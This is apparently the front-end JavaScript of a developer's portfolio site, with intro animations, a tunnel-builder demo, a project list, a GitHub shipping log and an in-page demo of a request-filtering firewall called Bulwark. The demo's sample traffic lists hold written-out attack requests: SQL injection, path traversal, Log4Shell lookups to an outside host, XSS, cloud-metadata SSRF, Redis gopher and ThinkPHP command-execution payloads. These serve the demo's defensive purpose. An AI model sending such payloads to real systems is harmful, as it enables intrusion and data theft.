// alex-aero.com — v4.1
import { SNAPSHOT } from "./snapshot.js?v=4.2.0";
import { film } from "./film.js?v=4.2.0";

const $ = (s, el = document) => el.querySelector(s);
const $$ = (s, el = document) => [...el.querySelectorAll(s)];
const h = (tag, props = {}, ...kids) => {
  const el = document.createElement(tag);
  for (const [k, v] of Object.entries(props)) {
    if (k === "class") el.className = v;
    else if (k.startsWith("on")) el.addEventListener(k.slice(2), v);
    else el.setAttribute(k, v);
  }
  for (const kid of kids.flat()) if (kid != null && kid !== false) el.append(kid.nodeType ? kid : document.createTextNode(kid));
  return el;
};
const REDUCED = matchMedia("(prefers-reduced-motion: reduce)").matches;
const pick = (a) => a[(Math.random() * a.length) | 0];
const rand = (a, b) => a + Math.random() * (b - a);
const DAY = 864e5;

function ago(iso) {
  const s = Math.max(0, (Date.now() - new Date(iso)) / 1000);
  if (s < 3600) return `${Math.max(1, (s / 60) | 0)}m ago`;
  if (s < 86400) return `${(s / 3600) | 0}h ago`;
  if (s < 86400 * 30) return `${(s / 86400) | 0}d ago`;
  if (s < 86400 * 365) return `${(s / 86400 / 30) | 0}mo ago`;
  return `${(s / 86400 / 365) | 0}y ago`;
}
function splitVersion(msg) {
  const m = /^(?:[\w-]+ )?v?(\d+\.\d+\.\d+)\s*[:—-]\s*(.*)$/.exec(msg);
  return m ? [m[1], m[2]] : [null, msg];
}

/* ───────── the mainstream projects (only these go on the site) ───────── */
const P = {
  "aegis-burrow": { name: "Aegis × Burrow", logo: "aegis-burrow", c: "#e8eaed" },
  bulwark: { name: "Bulwark", logo: "bulwark", c: "#ff6a3d" },
  "animated-fiesta": { name: "Selkies Forge", logo: "forge", owner: "adatskov-wcpss", c: "#7aa7ff",
    desc: "Any Linux machine, even a Raspberry Pi, becomes a launch pad for 153 Linux desktops in the browser. It downloads or builds the desktop, starts it in Docker, checks that it really works, and hands you a link. One file." },
  "burrow-pages": { name: "Burrow Pages", logo: "burrow-pages", c: "#3ddc97",
    desc: "Static sites from your GitHub or GitLab repos, an upload, or a site that lives elsewhere, on your own subdomains behind a password. Every push goes live. Built as a Burrow extension." },
  selfmail: { name: "selfmail", logo: "selfmail", c: "#4f8cff",
    desc: "A real mail server with a modern webmail app, for home servers that can't open port 25. Postfix and DKIM in one script, DNS through Cloudflare, undo send, every domain in one inbox." },
  weft: { name: "Weft", logo: "weft", c: "#c9b8ff",
    desc: "The addon format behind Selkies Forge and Aegis × Burrow: one manifest and five bash scripts, and a mesh where running addons find each other. Ships a validator and a brief for AI agents." },
};
const REPOS = Object.keys(P);
const repoUrl = (id) => `https://github.com/${P[id]?.owner || "alexd-aero"}/${id}`;
const logo = (id, cls = "") => h("img", { src: `assets/brand/${P[id].logo}.svg`, alt: "", class: cls });
const WORK = ["animated-fiesta", "burrow-pages", "selfmail", "weft"];

/* ───────── small things ───────── */
function nav() {
  const bar = $("#nav");
  const on = () => bar.classList.toggle("solid", scrollY > 30);
  addEventListener("scroll", on, { passive: true }); on();
  const links = new Map($$(".nav nav a").map((a) => [a.getAttribute("href").slice(1), a]));
  const io = new IntersectionObserver((es) => {
    for (const e of es) if (e.isIntersecting) for (const [id, a] of links) a.classList.toggle("on", id === e.target.id);
  }, { rootMargin: "-45% 0px -50% 0px" });
  for (const id of links.keys()) { const s = document.getElementById(id); if (s) io.observe(s); }
  // the phone menu
  const btn = $("#menu-btn"), sheet = $("#menu");
  const set = (open) => { sheet.hidden = !open; btn.setAttribute("aria-expanded", open); document.documentElement.classList.toggle("menu-open", open); };
  btn.addEventListener("click", () => set(sheet.hidden));
  sheet.addEventListener("click", (e) => { if (e.target.closest("a") || e.target === sheet) set(false); });
  addEventListener("keydown", (e) => { if (e.key === "Escape") set(false); });
}
function reveal() {
  const io = new IntersectionObserver((es) => { for (const e of es) if (e.isIntersecting) { e.target.classList.add("in"); io.unobserve(e.target); } }, { rootMargin: "0px 0px -6% 0px" });
  for (const el of $$(".banner, .split, .burrow-grid, .burrow-list, .bwc, .work, .board, .cmd")) { el.classList.add("reveal"); io.observe(el); }
}
function copyButtons() {
  for (const b of $$(".copy")) b.addEventListener("click", async () => {
    try { await navigator.clipboard.writeText($("#" + b.dataset.copy).textContent.trim()); b.textContent = "Copied"; b.classList.add("done"); }
    catch { getSelection().selectAllChildren($("#" + b.dataset.copy)); b.textContent = "Selected"; }
    setTimeout(() => { b.textContent = "Copy"; b.classList.remove("done"); }, 1600);
  });
}
function whileVisible(el, fn) {
  let on = false, raf = 0, last = 0, seen = false;
  const loop = (t) => { fn(Math.min(64, t - (last || t)), t); last = t; raf = requestAnimationFrame(loop); };
  const set = (v) => { if (v === on) return; on = v; if (on) { last = 0; raf = requestAnimationFrame(loop); } else cancelAnimationFrame(raf); };
  new IntersectionObserver(([e]) => { seen = e.isIntersecting; set(seen && !document.hidden); }).observe(el);
  document.addEventListener("visibilitychange", () => set(seen && !document.hidden));
}

/* ───────── hello: the page opens the way the film used to ───────── */
// Letters rise out of a soft blur where the line will sit in the middle of the
// screen, the line glides up to its place, and the rest follows, overlapping.
// Compositor-only (transform, opacity, filter) and driven by the Web Animations API.
const EXPO = "cubic-bezier(.16, 1, .3, 1)", GLIDE = "cubic-bezier(.65, 0, .35, 1)";
async function hello() {
  const root = document.documentElement, text = $(".hl-t"), hi = $(".hl-hi"), full = text.textContent;
  text.replaceChildren(...[...full].map((ch) => h("span", { class: "hl-l" }, ch)));
  const go = !(REDUCED || location.hash || scrollY > 40) && "animate" in Element.prototype;
  if (!go) { root.classList.remove("hl-wait"); return; }
  // fonts first, so nothing reflows mid-animation (but never wait long)
  await Promise.race([document.fonts?.ready, new Promise((r) => setTimeout(r, 700))]);
  const anims = [];
  const run = (el, frames, o) => anims.push(el.animate(frames, { fill: "both", ...o }));
  const rise = (el, delay, dist = 22, dur = 900, blur = 6) => run(el,
    [{ opacity: 0, transform: `translateY(${dist}px)`, filter: `blur(${blur}px)` }, { opacity: 1, transform: "none", filter: "blur(0)" }], { duration: dur, delay, easing: EXPO });
  // the line starts in the middle of the screen
  const r = hi.getBoundingClientRect(), mid = innerHeight / 2 - (r.top + r.height / 2);
  run(hi, [{ transform: `translateY(${mid}px)` }, { transform: `translateY(${mid}px)`, offset: 0.001 }, { transform: "none" }], { duration: 1200, delay: 1450, easing: GLIDE });
  $$(".hl-l").forEach((l, i) => run(l, [{ opacity: 0, transform: "translateY(.32em)", filter: "blur(10px)" }, { opacity: 1, transform: "none", filter: "blur(0)" }],
    { duration: 1000, delay: 120 + i * 42, easing: EXPO }));
  rise($(".hl-sub"), 2050, 18);
  rise($(".hl-k"), 2350, 12, 700, 0);
  $$(".hl-p").forEach((p, i) => run(p, [{ opacity: 0, transform: "translateY(26px) scale(.97)", filter: "blur(6px)" }, { opacity: 1, transform: "none", filter: "blur(0)" }],
    { duration: 950, delay: 2450 + i * 85, easing: EXPO }));
  rise($(".hl-go"), 3150, 14);
  root.classList.remove("hl-wait");
  // anyone in a hurry gets it all at once; afterwards nothing is left holding a style
  const finish = () => { anims.forEach((a) => a.finish()); off(); };
  const off = () => { for (const ev of ["wheel", "touchmove", "keydown", "pointerdown"]) removeEventListener(ev, finish); };
  for (const ev of ["wheel", "touchmove", "keydown", "pointerdown"]) addEventListener(ev, finish, { passive: true });
  Promise.all(anims.map((a) => a.finished)).then(() => { off(); anims.forEach((a) => a.cancel()); }).catch(() => {});
}

/* ───────── the film ───────── */
function theFilm() {
  const f = film($("#player"), { reduced: REDUCED });
  const list = $("#chapters"), cap = $("#caption");
  const btns = f.scenes.map((s, i) => {
    const b = h("button", { type: "button", onclick: () => f.jump(i) }, h("b", {}, `${Math.floor(s.start / 60)}:${String(Math.floor(s.start % 60)).padStart(2, "0")}`), s.chapter);
    list.append(h("li", {}, b));
    return b;
  });
  f.onScene((i, scenes, text, changed) => {
    btns.forEach((b, k) => b.classList.toggle("on", k === i));
    if (changed && matchMedia("(max-width: 680px)").matches) { const b = btns[i]; if (b) list.scrollTo({ left: b.parentElement.offsetLeft - 16, behavior: "smooth" }); }
    cap.textContent = text;
  });
  $("#hl-len").textContent = `${Math.floor(f.total / 60)}:${String(Math.floor(f.total % 60)).padStart(2, "0")}`;
  // the hello's button plays it from the top
  $(".hl-go").addEventListener("click", (e) => {
    e.preventDefault();
    $("#film").scrollIntoView({ behavior: REDUCED ? "auto" : "smooth", block: matchMedia("(max-width: 680px)").matches ? "start" : "center" });
    f.jump(0);
  });
}

/* ───────── burrow: the builder and the tunnel ───────── */
function burrow() {
  const port = $("#b-port"), name = $("#b-name"), zone = $("#b-zone"), url = $("#b-url"), note = $("#b-note");
  let mode = "own", who = "login";
  const quickName = () => {
    const w = ["river", "amber", "quiet", "tiger", "lunar", "maple", "cobalt", "orbit", "velvet", "harbor"];
    const s = (name.value || "x").split("").reduce((a, c) => (a * 31 + c.charCodeAt(0)) >>> 0, +port.value || 7);
    return `${w[s % 10]}-${w[(s >>> 4) % 10]}-${w[(s >>> 8) % 10]}-${w[(s >>> 12) % 10]}`;
  };
  function update() {
    port.value = port.value.replace(/\D/g, "").slice(0, 5);
    name.value = name.value.toLowerCase().replace(/[^a-z0-9-]/g, "").slice(0, 30);
    const p = port.value || "3000", n = name.value || `tunnel-${p}`;
    const host = mode === "own" ? `${n}.example.com` : mode === "wild" ? `${n}.tunnel.example.com` : `${quickName()}.trycloudflare.com`;
    zone.textContent = mode === "own" ? ".example.com" : mode === "wild" ? ".tunnel.example.com" : "";
    name.disabled = mode === "quick";
    name.parentElement.style.opacity = mode === "quick" ? 0.45 : 1;
    url.textContent = `https://${host}`;
    $("#out-url").textContent = host;
    $("#out-port").textContent = `127.0.0.1:${p}`;
    const gate = who === "login" ? "behind your Aegis login" : who === "pass" ? "behind a password of its own" : "open to anyone";
    const extra = mode === "wild" ? "Your certificate, served from the VPS relay." : mode === "quick" ? "A random free address; no domain needed." : "A DNS record Burrow made and owns.";
    note.textContent = `→ 127.0.0.1:${p} · ${gate}, Bulwark in front. ${extra}`;
  }
  port.addEventListener("input", update); name.addEventListener("input", update);
  for (const [box, set] of [["#b-mode", (b) => (mode = b.dataset.m)], ["#b-who", (b) => (who = b.dataset.w)]]) {
    $(box).addEventListener("click", (e) => {
      const b = e.target.closest("button"); if (!b) return;
      $$("button", $(box)).forEach((x) => x.classList.toggle("on", x === b)); set(b); update();
    });
  }
  update();
  const g = $("#tunnel-pk"), arch = $("#tunnel-svg .a2"), L = arch.getTotalLength(), dots = [];
  for (let i = 0; i < 7; i++) { const c = document.createElementNS("http://www.w3.org/2000/svg", "circle"); c.setAttribute("r", "3.5"); g.append(c); dots.push({ c, k: i / 7, side: i % 2 }); }
  const draw = (dt) => {
    for (const d of dots) {
      d.k = (d.k + dt * 0.00018) % 1;
      const pt = arch.getPointAtLength((d.side ? d.k : 1 - d.k) * L), toLight = Math.max(0, (d.k - 0.82) / 0.18);
      d.c.setAttribute("cx", pt.x + (200 - pt.x) * toLight);
      d.c.setAttribute("cy", pt.y + (215 - pt.y) * toLight);
      d.c.setAttribute("opacity", (1 - toLight) * Math.min(1, d.k * 6));
    }
  };
  if (REDUCED) draw(0); else whileVisible($("#tunnel-svg"), draw);
}

/* ───────── bulwark, live in the page ───────── */
const UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36";
const CHIPS = [
  ["SQLi", "/?id=1%27%20OR%20%271%27%3D%271"],
  ["../ double-encoded", "/..%252f..%252f..%252fetc%252fpasswd"],
  ["fullwidth ．．／", "/．．／．．／etc/passwd"],
  ["Log4Shell", "/?x=%24%7Bjndi%3Aldap%3A%2F%2F198.51.100.7%2Fa%7D"],
  ["hidden XSS", "/?q=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E"],
  ["Apache CVE-2021-41773", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"],
  ["cloud metadata", "/?u=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"],
  ["/.env", "/.env"],
  ["O'Reilly", "/authors?name=O%27Reilly", true],
  ["“select from table”", "/search?q=how+to+select+from+table+where+id+%3D+1", true],
];
const TRAFFIC = [
  ["GET", "/"], ["GET", "/assets/app.3f9c1e.js"], ["GET", "/api/feed?page=2&limit=20"], ["GET", "/search?q=how+to+select+from+table+where+id+%3D+1"],
  ["GET", "/authors?name=O%27Reilly"], ["GET", "/oauth/callback?code=4%2F0AfJohXk&state=eyJhbGciOiJIUzI1NiJ9.eyJyIjoiLyJ9.sig"], ["GET", "/favicon.ico"],
  ["PROPFIND", "/dav/notes/"], ["GET", "/blog/2026/11/hello-world"], ["POST", "/api/session"], ["GET", "/img/cat.webp?w=640"],
  ["GET", "/.env"], ["GET", "/.git/config"], ["GET", "/wp-login.php"], ["GET", "/?id=1%27%20OR%20%271%27%3D%271"],
  ["GET", "/..%252f..%252f..%252fetc%252fpasswd"], ["GET", "/?x=%24%7Bjndi%3Aldap%3A%2F%2F198.51.100.7%2Fa%7D"],
  ["GET", "/", "${${::-j}${::-n}di:ldap://198.51.100.7/x}"], ["GET", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"],
  ["GET", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"], ["GET", "/?u=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"],
  ["GET", "/?q=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E"], ["GET", "/．．／．．／etc/passwd"], ["GET", "/?n=%7B%7B7*7%7D%7D"],
  ["GET", "/actuator/env"], ["GET", "/alfa.php"], ["GET", "/shell.php?cmd=id"], ["GET", "/?file=php://filter/convert.base64-encode/resource=index.php"],
  ["GET", "/boaform/admin/formLogin"], ["GET", "/?id=1;DROP%20TABLE%20users--"],
  ["GET", "/index.php?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id"],
  ["GET", "/?u=gopher://127.0.0.1:6379/_FLUSHALL"], ["GET", "/", "sqlmap/1.8.4#stable (https://sqlmap.org)"], ["TRACE", "/"],
  ["GET", "/xmlrpc.php"], ["GET", "/.aws/credentials"], ["GET", "/docker/containers/json"],
];
const FLAG_NAMES = { double: "double-encoded", unicode: "%u escapes", overlong: "overlong UTF-8", nul: "null bytes", backslash: "backslashes", entity: "HTML entities", fold: "look-alike characters" };
const POOL = Array.from({ length: 9 }, (_, i) => ["203.0.113.", "198.51.100.", "192.0.2."][i % 3] + (17 + i * 23));
const YOU = "you (this browser)";

async function bulwark() {
  const engineEl = $("#bw-engine");
  let E;
  try {
    const [pl, nm] = await Promise.all([import("./bulwark/payloads.js"), import("./bulwark/normalize.js")]);
    E = { inspect: pl.inspect, cat: pl.categoryById, normalize: nm.normalize };
    const run = (n) => { const t0 = performance.now(); for (let i = 0; i < n; i++) E.inspect({ method: "GET", path: `/?id=1%27%20OR%20%271%27%3D%271&_=${i}${Math.random()}`, ua: UA }); return ((performance.now() - t0) / n) * 1000; };
    run(400);
    const us = run(400);
    engineEl.textContent = `real engine · ≈${us < 10 ? us.toFixed(1) : Math.round(us)} µs per new URL here`;
    engineEl.classList.add("ok");
  } catch { engineEl.textContent = "the engine didn't load in this browser"; return; }

  const score = new Map(), banned = new Set(), cats = new Map();
  let nReq = 0, nDrop = 0, nBan = 0;
  function judge(m, p, ua, ip, count = true) {
    const r = E.inspect({ method: m, path: p, ua });
    let kind = r.score === 3 ? "drop" : r.score === 1 ? "warn" : "pass", ban = false;
    if (!count) return { r, kind, ban, pts: 0 };
    nReq++;
    if (banned.has(ip)) kind = "ban";
    else if (kind === "drop") {
      nDrop++;
      const s = (score.get(ip) || 0) + 5; score.set(ip, s);
      if (s >= 10) { banned.add(ip); ban = true; nBan++; }
    }
    if (r.cat) { const c = E.cat(r.cat); const o = cats.get(r.cat) || { n: 0, c }; o.n++; cats.set(r.cat, o); }
    return { r, kind, ban, pts: score.get(ip) || 0 };
  }
  function stats() {
    $("#k-req").textContent = nReq; $("#k-drop").textContent = nDrop; $("#k-ban").textContent = nBan;
    const top = [...cats.values()].sort((a, b) => b.n - a.n).slice(0, 7), max = top[0]?.n || 1;
    $("#cats").replaceChildren(...top.map(({ n, c }) => h("div", { class: "bar" }, h("span", {}, c?.short || "?"), h("i", { style: `width:${(n / max) * 100}%;background:${c?.color || "#888"}` }), h("b", {}, n))));
  }
  const form = $("#probe"), input = $("#probe-path"), method = $("#probe-method"), steps = $$("#steps span");
  let timers = [];
  function show(m, path, ua = UA, ip = YOU, count = true) {
    if (!path.startsWith("/")) path = "/" + path;
    const { r, kind, ban, pts } = judge(m, path, ua, ip, count);
    if (ban && ip === YOU) { banned.delete(YOU); score.delete(YOU); }
    const n = E.normalize(path);
    timers.forEach(clearTimeout); timers = [];
    steps.forEach((s) => s.classList.remove("lit"));
    const step = REDUCED ? 0 : 90;
    steps.forEach((s, i) => timers.push(setTimeout(() => { steps.forEach((x) => x.classList.remove("lit")); s.classList.add("lit"); }, i * step)));
    timers.push(setTimeout(() => {
      steps.forEach((x) => x.classList.remove("lit"));
      $("#verdict").className = "verdict " + (ban || kind === "ban" ? "ban" : kind);
      $("#v-badge").textContent = ban ? "banned" : kind === "ban" ? "already banned" : kind === "drop" ? "dropped" : kind === "warn" ? (r.probe ? "probe" : r.label ? "label" : "flagged") : "through";
      $("#v-name").textContent = r.name ? r.name[0].toUpperCase() + r.name.slice(1) : "A normal request";
      const facts = [];
      const add = (k, v) => facts.push(h("dt", {}, k), h("dd", {}, v));
      if (r.cat) { const c = E.cat(r.cat); add("category", h("span", { class: "cat", style: `--cc:${c?.color || "#888"}` }, c?.name || r.cat)); }
      if (r.cves?.length) add("CVE", r.cves.join(", "));
      if (r.det) add("why", r.det);
      if (r.hits?.length > 1) add("hits", r.hits.join(" + "));
      add("request", `${r.pts} points${r.score === 3 ? " (5 or more is a payload)" : ""}`);
      const seen = n.path + (n.query ? "?" + n.query : "");
      if (seen !== path) add("decoded", seen.length > 100 ? seen.slice(0, 100) + "…" : seen);
      const flags = Object.keys(n.flags).filter((f) => FLAG_NAMES[f]);
      if (flags.length) add("undid", h("span", {}, ...flags.map((f) => h("span", { class: "flag" }, FLAG_NAMES[f]))));
      if (count) add("address", `${ip}: ${pts} points${ban ? ", banned" : " (10 bans)"}`);
      add("then", ban ? "Your second payload: banned on every tunnel at once, until you sign in. (This page lets you off, so keep going.)" :
        kind === "ban" ? "Banned addresses get nothing until the ban lifts." :
        kind === "drop" ? (count ? "Dropped with a 404 before your app sees it. One more payload from this address bans it." : "Dropped with a 404 before your app sees it. Two of these from one address ban it.") :
        r.probe ? "Asking for software that may not be here. It only counts if the app answers 404." :
        r.label ? "A label for the log, never a ban by itself." :
        kind === "warn" ? "Points against the address, not enough to drop it alone." :
        "Straight through to the app. No false alarm.");
      $("#v-facts").replaceChildren(...facts);
      stats();
    }, step * 4));
  }
  form.addEventListener("submit", (e) => { e.preventDefault(); show(method.value, input.value.trim() || "/"); });
  for (const [label, p, safe] of CHIPS) $("#chips").append(h("button", { type: "button", class: safe ? "safe" : "", onclick: () => { method.value = "GET"; input.value = p; show("GET", p); } }, label));
  const feed = $("#feed");
  function feedOne() {
    const [m, p, ua] = pick(TRAFFIC);
    const benign = !/[.%$<>{]|wp-|php|admin|actuator|boa|docker|xmlrpc|TRACE/.test(p + m) && !ua;
    const ip = benign ? `10.0.0.${2 + ((Math.random() * 6) | 0)}` : pick(POOL);
    const { r, kind, ban } = judge(m, p, ua || UA, ip);
    const c = r.cat ? E.cat(r.cat) : null;
    const vd = ban ? "banned · every tunnel" : kind === "ban" ? "banned" : kind === "drop" ? "dropped" : kind === "warn" ? (r.probe ? "probe" : "flagged") : "through";
    feed.prepend(h("div", { class: `r ${kind === "ban" ? "drop ban" : kind}${ban ? " ban" : ""}`, title: "Open in the console", onclick: () => { method.value = m; input.value = p; show(m, p, ua || UA); $("#probe").scrollIntoView({ behavior: "smooth", block: "center" }); } },
      h("span", { class: "ip" }, ip), h("span", { class: "pth" }, h("s", {}, m + " "), ua ? `${p}  ua: ${ua}` : p),
      h("span", { class: "ct", style: `--cc:${c?.color || "#5b616a"}` }, c?.short || "clean"), h("span", { class: "vd" }, vd)));
    while (feed.children.length > 9) feed.lastChild.remove();
    stats();
  }
  for (let i = 0; i < 7; i++) feedOne();
  show("GET", input.value, UA, YOU, false);
  let next = 0;
  if (!REDUCED) whileVisible($("#bwc"), (dt, t) => { if (t > next) { feedOne(); next = t + rand(800, 1700); } });
}

/* ───────── work ───────── */
function work() {
  $("#work-list").append(...WORK.map((id) => {
    const p = P[id];
    return h("a", { class: "w-row", "data-repo": id, href: repoUrl(id), target: "_blank", rel: "noopener", style: `--c:${p.c}` },
      logo(id), h("span", { class: "w-name" }, p.name, h("span", { class: "ver" })), h("span", { class: "w-desc" }, p.desc), h("span", { class: "w-meta" }));
  }));
}

/* ───────── the shipping log ───────── */
const CACHE_KEY = "ax-gh-5", CACHE_MS = 20 * 60 * 1000;
async function github() {
  try { const c = JSON.parse(localStorage.getItem(CACHE_KEY) || "null"); if (c && Date.now() - c.t < CACHE_MS) return { ...c.d, live: true }; } catch {}
  const get = async (p) => { const r = await fetch("https://api.github.com/" + p, { headers: { Accept: "application/vnd.github+json" } }); if (!r.ok) throw new Error(r.status); return r.json(); };
  const res = await Promise.allSettled(REPOS.map((id) => get(`repos/${P[id].owner || "alexd-aero"}/${id}/commits?per_page=100`)));
  if (res.every((r) => r.status === "rejected")) return { ...SNAPSHOT, live: false };
  const commits = [];
  res.forEach((r, i) => {
    const id = REPOS[i];
    if (r.status !== "fulfilled") { commits.push(...SNAPSHOT.commits.filter((c) => c.repo === id)); return; }
    for (const c of r.value) commits.push({ repo: id, sha: c.sha.slice(0, 7), msg: c.commit.message.split("\n")[0], date: c.commit.author.date });
  });
  commits.sort((a, b) => (a.date < b.date ? 1 : -1));
  const d = { at: new Date().toISOString(), commits };
  try { localStorage.setItem(CACHE_KEY, JSON.stringify({ t: Date.now(), d })); } catch {}
  return { ...d, live: true };
}
// what kind of release a version is, next to the one before it in the same project
function kinds(commits) {
  const byRepo = {};
  for (const c of [...commits].reverse()) {
    const [v, rest] = splitVersion(c.msg);
    c.ver = v; c.text = rest;
    if (!v) { c.kind = "commit"; continue; }
    const a = byRepo[c.repo]?.split(".").map(Number), b = v.split(".").map(Number);
    c.kind = !a ? "release" : b[0] > a[0] ? "major" : b[1] > a[1] ? "feature" : b[2] > a[2] ? "fix" : "release";
    byRepo[c.repo] = v;
  }
  return commits;
}
const KIND_LABEL = { major: "major", feature: "new", fix: "fix", release: "release", commit: "commit" };
const dayKey = (d) => new Date(d).toLocaleDateString("en-CA");
function dayName(key) {
  if (key === dayKey(Date.now())) return "Today";
  if (key === dayKey(Date.now() - DAY)) return "Yesterday";
  return new Date(key + "T12:00:00").toLocaleDateString("en-US", { weekday: "long", month: "short", day: "numeric" });
}

const LOG = { commits: [], filter: "all", shown: 14, live: false, at: null };
function renderLog() {
  const commits = LOG.commits, now = Date.now(), cut = now - 30 * DAY;
  const recent = commits.filter((c) => new Date(c.date) > cut), releases = recent.filter((c) => c.ver), latest = commits.find((c) => c.ver);
  $("#log-stats").replaceChildren(
    h("div", {}, h("b", {}, releases.length), h("span", {}, "releases in 30 days")),
    h("div", {}, h("b", {}, recent.length), h("span", {}, "commits in 30 days")),
    h("div", {}, h("b", {}, new Set(recent.map((c) => dayKey(c.date))).size), h("span", {}, "of the last 30 days I shipped")),
    h("div", {}, h("b", {}, latest ? ago(latest.date).replace(" ago", "") : "–"), h("span", {}, "since the last release")));
  // the board: one row per project, with 30 days of activity
  $("#board").replaceChildren(...REPOS.map((id) => {
    const p = P[id], mine = commits.filter((c) => c.repo === id), rel = mine.find((c) => c.ver);
    const days = Array.from({ length: 30 }, (_, i) => mine.filter((c) => dayKey(c.date) === dayKey(now - (29 - i) * DAY)).length);
    const max = Math.max(1, ...days);
    return h("button", { type: "button", class: "b-row" + (LOG.filter === id ? " on" : ""), style: `--c:${p.c}`, "aria-pressed": LOG.filter === id, onclick: () => { LOG.filter = LOG.filter === id ? "all" : id; LOG.shown = 14; renderLog(); } },
      logo(id), h("span", { class: "b-name" }, h("b", {}, p.name), h("span", {}, rel ? `released ${ago(rel.date)}` : "no release yet")),
      h("span", { class: "b-ver" }, rel ? rel.ver : "–"),
      h("span", { class: "b-days", title: "commits a day, last 30 days" }, ...days.map((n, i) => h("i", { class: n ? "on" : "", style: n ? `opacity:${0.3 + 0.7 * (n / max)}` : "", title: `${dayName(dayKey(now - (29 - i) * DAY))}: ${n} commit${n === 1 ? "" : "s"}` }))),
      h("span", { class: "b-n" }, h("b", {}, mine.filter((c) => c.ver && new Date(c.date) > cut).length), " releases"));
  }));
  $("#log-filter").replaceChildren(...["all", ...REPOS].map((id) => h("button", { type: "button", class: LOG.filter === id ? "on" : "", onclick: () => { LOG.filter = id; LOG.shown = 14; renderLog(); } },
    id === "all" ? "Everything" : [logo(id), P[id].name])));
  // the timeline, grouped by day
  const list = commits.filter((c) => LOG.filter === "all" || c.repo === LOG.filter), shown = list.slice(0, LOG.shown), groups = [];
  for (const c of shown) { const k = dayKey(c.date); if (!groups.length || groups.at(-1).k !== k) groups.push({ k, items: [] }); groups.at(-1).items.push(c); }
  $("#timeline").replaceChildren(...groups.map((g) => h("li", { class: "day" },
    h("p", { class: "day-h" }, h("b", {}, dayName(g.k)), h("span", {}, `${g.items.length} change${g.items.length === 1 ? "" : "s"}`)),
    h("ol", {}, ...g.items.map((c) => h("li", { class: `ev k-${c.kind}`, style: `--c:${P[c.repo].c}` },
      h("a", { href: `${repoUrl(c.repo)}/commit/${c.sha}`, target: "_blank", rel: "noopener" },
        logo(c.repo, "ev-logo"),
        h("span", { class: "ev-main" },
          h("span", { class: "ev-top" }, h("b", {}, P[c.repo].name), c.ver ? h("span", { class: "ev-ver" }, c.ver) : null, h("span", { class: "ev-kind" }, KIND_LABEL[c.kind])),
          h("span", { class: "ev-msg" }, (c.text[0] || "").toUpperCase() + c.text.slice(1))),
        h("span", { class: "ev-time" }, h("time", { datetime: c.date, title: new Date(c.date).toLocaleString() }, new Date(c.date).toLocaleTimeString([], { hour: "numeric", minute: "2-digit" })), h("code", {}, c.sha)))))))));
  const more = $("#log-more");
  more.hidden = list.length <= LOG.shown;
  more.textContent = `Show ${Math.min(20, list.length - LOG.shown)} more`;
  $("#log-src").textContent = LOG.live ? "Live from GitHub: every commit to my main projects." : `Every commit to my main projects, as of ${new Date(LOG.at).toLocaleDateString()}.`;
}
function renderMeta() {
  const vers = {};
  for (const c of LOG.commits) if (!vers[c.repo] && c.ver) vers[c.repo] = c.ver;
  for (const el of $$("[data-ver]")) if (vers[el.dataset.ver]) el.textContent = vers[el.dataset.ver];
  if (LOG.commits[0]) $("#nav-live").textContent = `pushed ${ago(LOG.commits[0].date)}`;
  for (const row of $$(".w-row")) {
    const id = row.dataset.repo, last = LOG.commits.find((c) => c.repo === id);
    if (vers[id]) $(".ver", row).textContent = vers[id];
    if (last) $(".w-meta", row).replaceChildren(Date.now() - new Date(last.date) < 7 * DAY ? h("span", { class: "fresh" }, "● ") : "", `updated ${ago(last.date)}`);
  }
}
function useData(data) {
  LOG.commits = kinds(data.commits.map((c) => ({ ...c })));
  LOG.live = data.live; LOG.at = data.at;
  renderMeta();
  renderLog();
}
async function live() {
  $("#log-more").addEventListener("click", () => { LOG.shown += 20; renderLog(); });
  useData({ ...SNAPSHOT, live: false });
  try { useData(await github()); } catch {}
}

/* ───────── go ───────── */
nav();
hello();
theFilm();
burrow();
work();
copyButtons();
reveal();
live();
bulwark();
